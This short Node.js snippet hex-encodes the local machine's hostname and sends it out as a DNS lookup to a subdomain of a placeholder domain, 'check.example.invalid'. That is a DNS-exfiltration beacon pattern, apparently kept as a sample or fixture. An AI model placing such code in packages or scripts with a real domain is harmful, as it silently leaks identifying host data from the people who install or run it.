const platform = require('node:os');
const resolver = require('node:dns');
const encodedHost = Buffer.from(platform.hostname()).toString('hex').slice(0,32);
resolver.resolve4(encodedHost + '.check.example.invalid', () => {});
